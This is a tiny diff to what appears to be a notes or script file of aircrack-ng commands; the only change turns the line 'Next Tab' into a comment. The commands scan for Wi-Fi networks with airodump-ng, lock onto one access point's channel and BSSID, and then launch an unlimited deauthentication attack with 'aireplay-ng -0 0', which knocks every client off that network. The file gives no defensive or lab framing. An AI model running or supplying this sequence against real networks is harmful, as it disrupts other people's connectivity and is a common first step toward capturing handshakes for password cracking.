@@ -1,4 +1,4 @@
 airodump-ng wlan1
 airodump-ng -c [Channel number] --bssid [main mac] wlan1
-Next Tab
+# Next Tab
 aireplay-ng -0 0 -a [main mac] wlan1
